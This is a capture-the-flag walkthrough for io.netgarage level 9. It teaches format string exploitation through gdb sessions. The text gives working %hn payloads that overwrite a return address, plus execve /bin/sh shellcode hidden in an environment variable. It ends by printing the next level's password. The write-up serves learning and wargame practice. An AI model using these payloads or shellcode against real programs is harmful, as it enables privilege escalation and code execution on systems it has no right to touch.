---

title: Level 9
link: ssh level9@io.netgarage.org

---

This challenge involves a format string vulnerability. Quick explanation on that first.

Using `printf` and related function in C allows you to send formatted string to buffers (`stdout`, arrays, ...). The `printf` function is one of the most common and widely used by beginners because it's the one used to display stuff on the screen. The definition is:

    int printf( const char* format, ... );

Where `format` is the format string that will hold the values and `...` is a list of values to be used in the format string.

e.g.

    printf("%d & %f & %c", 1, 2.1, 'c');

It's quite straightforward: the printed string will be "1 & 2.1 & c", easy peasy.

Now the definition doesn't force us to pass arguments to the formatted string, for example you can do:

    printf("Hello world!");

Nice, now look at that:

    printf("Wait what ? %p");

`%p` is the format specifier for displaying a pointer. So this string should display a pointer, but which one, if no arguments are passed...

Let's explore that with the following example:

    #include <stdio.h>

    int main(int argc, char *argv[]){
            int a = atoi(argv[1]);
            printf(argv[2]);
            printf("\na = %d\n", a);
    }

We're simply saving the first argument to a and passing the second argument to `printf`:

    $ ./a.out 1 aa
    aa
    a = 1
    $ ./a.out 1 %p
    0x2f
    a = 1

Wait what? What is this value?

    ./a.out 1 %p.%p.%p
    0x2f.0x80496e0.0x80484c2
    a = 1

Hum, interesting, it seems that we can access variable's address, but can we access the value?

    $ ./a.out 1 %d.%d.%d.%d.%d.%d.%d
    47.134518548.134513890.3.-1073742604.-1073742588.1
    a = 1
    $ ./a.out 2 %d.%d.%d.%d.%d.%d.%d
    47.134518548.134513890.3.-1073742604.-1073742588.2
    a = 2

Nice! It seems that the 8th value is linked to `a`. Let's explore the memory with `gdb` to ensure that is true.

    $ gdb a.out
    (gdb) disass main
    Dump of assembler code for function main:
       ...
       0x08048461 <+54>:    push   %eax
       0x08048462 <+55>:    call   0x80482f0 <printf@plt>
       0x08048467 <+60>:    add    $0x10,%esp
       ...
    End of assembler dump.
    (gdb) b *0x08048462
    Breakpoint 1 at 0x8048462
    (gdb) r 2 %d.%d.%d.%d.%d.%d.%d
    Starting program: /tmp/aa/a.out 2 %d.%d.%d.%d.%d.%d.%d
    Breakpoint 1, 0x08048462 in main ()
    (gdb) x/10wx $esp
    0xbffffc00:     0xbffffe13      0x0000002f      0x08049714      0x080484e2
    0xbffffc10:     0x00000003      0xbffffcd4      0xbffffce4      0x00000002
    0xbffffc20:     0xbffffc40      0xb7fc9000
    (gdb) x/s 0xbffffe13
    0xbffffe13:     "%d.%d.%d.%d.%d.%d.%d"

We can see the first element on the stack is the address to our string, and at `0xbffffc10` is our `2` value. So we have a direct access to it's value / address using the `%d`/`%p` modifier. 

Great, we can print memory, but it's far more interesting to be able to write in memory. For that we can use the `%n` modifier:

> returns the number of characters written so far by this call to the function.  The result is written to the value pointed to by the argument.

So if we do something like:


    printf("1234%n", n);

`n` will be equal to `4`.

Let's try that with our program, just replace the last `%d` with `%n`:

    (gdb) r 2 %d.%d.%d.%d.%d.%d.%n
    Starting program: /tmp/aa/a.out 2 %d.%d.%d.%d.%d.%d.%n
    Breakpoint 1, 0x08048462 in main ()
    (gdb) c
    Continuing.
    Program received signal SIGSEGV, Segmentation fault.
    0xb7e677ec in _IO_vfprintf_internal (s=0xb7fc9ac0 <_IO_2_1_stdout_>, format=<optimized out>,
        format@entry=0xbffffe13 "%d.%d.%d.%d.%d.%d.%n", ap=0xbffffc20 "@\374\377\277", ap@entry=0xbffffc04 "/") at vfprintf.c:1641
    1641    vfprintf.c: No such file or directory.

Oh, we hit a `Segmentation fault` why is that? The current instruction is:

    (gdb) x/i $eip
    => 0xb7e677ec <_IO_vfprintf_internal+17756>:    mov    %ecx,(%eax)

Which moves the current value of `ecx` into the memory pointed by the value of `eax`.

    (gdb) x/x $eax
    0x2:    Cannot access memory at address 0x2

But here our current pointer's value is `2` (as expected), so trying to write into the memory address `2` is definitely not going to work. What can we override instead? What about `main`'s return address?

Firstly, let's find it:

    (gdb) r 2 'a'
    Breakpoint 1, 0x08048462 in main ()
    (gdb) info frame
    Stack level 0, frame at 0xbffffc10:
     eip = 0x8048462 in main; saved eip = 0xb7e39a63
     Arglist at 0xbffffbf8, args:
     Locals at 0xbffffbf8, Previous frame's sp is 0xbffffc10
     Saved registers:
      ebx at 0xbffffbf4, ebp at 0xbffffbf8, eip at 0xbffffc0c

The address we need to override is `0xbffffc0c`, to do that we'll construct two numbers that will override both parts of the address, like so:


    Payload    XXXX....YYYY....
    Address    bfff    fc0c

The space between `XXXX` and `YYYY` will be used to change the number of currently written char to compute the next address's part.

The process will be something like:

    1. Print `bfff` chars
    2. Point to `0xbffffc0c`
    3. `%hn` (the `h` here means that we're only writing 4 bytes)
    4. Print `fc0c` - `bfff` chars
    5. Point to `0xbffffc0c`
    6. `%hn`

Of course we need to make sure that our number of printed char is exact, to do that we can use this neat feature of the format strings:

    printf("%10d", n);

This will always display 10 chars, and fill the empty with spaces. So we can adjust our values quite precisely here.

Let's go back to the real program to exploit:

    #include <stdio.h>
    #include <string.h>

    int main(int argc, char **argv) {
            int  pad = 0xbabe;
            char buf[1024];
            strncpy(buf, argv[1], sizeof(buf) - 1);

            printf(buf);

            return 0;
    }


    level9@io:/levels$ gdb ./level09
    (gdb) r $(python -c "print 'AAAABBBBCCCC' + '%x.' * 10")
    Starting program: /levels/level09 $(python -c "print 'AAAABBBBCCCC' + '%x.' * 10")
    AAAABBBBCCCCbffffdfb.3ff.174.41414141.42424242.43434343.252e7825.78252e78.2e78252e.252e7825.[Inferior 1 (process 1688) exited normally]

We can clearly see our input buffer in memory `414141414` being `AAAA`, `4242424242` `BBBBB` and so on.

Let's get our return address again:


    (gdb) b *0x080483be
    Breakpoint 1 at 0x80483be
    (gdb) r a
    Starting program: /levels/level09 a
    Breakpoint 1, 0x080483be in main ()
    (gdb) info frame
    Stack level 0, frame at 0xbffffc60:
     eip = 0x80483be in main; saved eip = 0xb7e39a63
     Arglist at 0xbffffc58, args:
     Locals at 0xbffffc58, Previous frame's sp is 0xbffffc60
     Saved registers:
      ebp at 0xbffffc58, eip at 0xbffffc5c

So our addresses are `0xbffffc5c` and `0xbffffc5e`, let's verify that:

    (gdb) x 0xbffffc5c
    0xbffffc5c:     0xb7e39a63
    (gdb) x 0xbffffc5e
    0xbffffc5e:     0x0002b7e3

Our payload will be: "\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%8d%hn%8d%hn":

        \x3c\xfc\xff\xbf XXXX \x3e\xfc\xff\xbf %p%p%8d %hn %8d %hn
        \----------------------------------------------/

We're using `%8d` instead of `%p` for two of the values because `%p` can't be controlled with a number modifier, but %d can. Let's try our payload:

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%8d%hn%8d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%8d%hn%8d%hn')
    Breakpoint 1, 0x080483e9 in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xb7e39a63
    (gdb) ni
    0x080483ee in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0x002d0023

We wrote the `0x23` first, at the lower part of the address, why is that? Because it prevents any second-writing to overflow what we previously wrote.

Let's try to write something like `0x1337beef` in her. First, we need to get the offset required for `0xbeef`:

    (gdb) p 0xbeef - 0x23 + 0x8
    $1 = 48852

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%48852d%hn%8d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%48852d%hn%8d%hn')
    Breakpoint 2, 0x080483e9 in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xb7e39a63
    (gdb) ni
    0x080483ee in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xbef9beef

Same for the second part of the address, except this time we have to get to `0x11337` instead of `0x1337`. That's why we're writing the top part of the address after.

    (gdb) p 0x11337 - 0xbef9 + 0x10
    $1 = 21576

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%48852d%hn%21576d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%48852d%hn%21576d%hn')
    Breakpoint 1, 0x080483e9 in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xb7e39a63
    (gdb) ni
    0x080483ee in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0x1337beef

Nice! And of course if we continue the program, we'll try to jump to an unkown address:

    (gdb) c
    Continuing.

    Program received signal SIGSEGV, Segmentation fault.
    0x1337beef in ?? ()

Now let's put a shellcode in an env variable and let's point to it.

The shellcode is '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' and will be inserted in the `SHELLCODE` env variable:

    level9@io:/levels$ export SHELLCODE=$(python -c "print '\x90'*100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
    level9@io:/levels$ env
    XDG_SESSION_ID=69539
    SHELLCODE=1Ph//shh/binS̀
    TERM=screen-256color
    ...

Now we need to get its address, using https://raw.githubusercontent.com/nobe4/blocnote/master/C/getenv.c:

    level9@io:/tmp/aa$ ./getenv SHELLCODE
    SHELLCODE => 0xbffffdd0

And let's do the math all over again:

    level9@io:/levels$ gdb ./level09
    (gdb) b *0x080483ee
    Breakpoint 1 at 0x80483ee

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%8d%hn%8d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%8d%hn%8d%hn')
    Breakpoint 1, 0x080483ee in main ()

    (gdb) x 0xbffffc3c
    0xbffffc3c:     0x002d0023

    (gdb) p 0xfdd0 - 0x23 + 0x8
    $2 = 64949

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%8d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%8d%hn')
    Breakpoint 1, 0x080483ee in main ()

    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xfddafdd0

    (gdb) p 0x1bfff - 0xfdda
    $4 = 49701

    (gdb) p 0x1bfff - 0xfdda + 0x10
    $5 = 49717

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49717d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49717d%hn')
    Breakpoint 1, 0x080483ee in main ()

    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xc005fdd0

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49707d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49707d%hn')
    Breakpoint 1, 0x080483ee in main ()
    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xbffbfdd0

    (gdb) r $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49711d%hn')
    Starting program: /levels/level09 $(echo -e '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49711d%hn')
    Breakpoint 1, 0x080483ee in main ()

    (gdb) x 0xbffffc3c
    0xbffffc3c:     0xbffffdd0

After a bit of tweaking, here's the final payload: '\x3c\xfc\xff\xbfXXXX\x3e\xfc\xff\xbf%p%p%64949d%hn%49711d%hn' (had to change the address again:

    (gdb) r $(echo -e '\x9c\xfb\xff\xbfXXXX\x9e\xfb\xff\xbf%p%p%64949d%hn%49711d%hn')
    process 2553 is executing new program: /bin/bash
    sh-4.3$ exit

Nice, now on outside of gdb:

    level9@io:~$ ./level09 $(echo -e '\x9c\xfb\xff\xbfXXXX\x9e\xfb\xff\xbf%p%p%64949d%hn%49711d%hn')
    sh-4.2$ id
    uid=1009(level9) gid=1009(level9) euid=1010(level10) groups=1010(level10),1009(level9),1029(nosu)
    sh-4.2$ cat /home/level10/.pass
    UT3ROlnUqI0R2nJA

> UT3ROlnUqI0R2nJA
